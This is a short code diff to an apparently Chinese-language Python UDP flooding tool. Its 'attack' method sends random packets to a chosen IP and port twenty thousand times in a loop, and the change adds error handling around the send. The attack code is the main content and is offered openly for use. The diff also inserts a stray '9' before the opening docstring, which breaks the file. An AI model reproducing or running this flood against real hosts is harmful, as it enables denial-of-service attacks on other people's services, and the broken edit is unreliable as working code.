@@ -1,4 +1,4 @@
-"""
+9"""
 Author: Lucky Pupil ;
 Date:2022.05.01 ;
 National: Chinese ;
@@ -85,7 +85,10 @@ class Main(Cmd):
 			
 	def true_to_attack_attack(self): # 攻击主体部分
 		for i in range(20001):# 重复20002次，可以随意调整
-			so.sendto(randbyte,(self.ip,self.port)) # 发送数据包，格式(socket.sendto(data,(IP,port)))
+			try:
+				so.sendto(randbyte,(self.ip,self.port)) # 发送数据包，格式(socket.sendto(data,(IP,port)))
+			except Exception:
+				print('您没有设置IP地址或者没有正确设置IP地址')
 			print('这是第',i+1,'攻击!') #输出，让用户知道在攻击
 
 	def true_to_attack_thread(self): # 攻击线程启动与设置部分
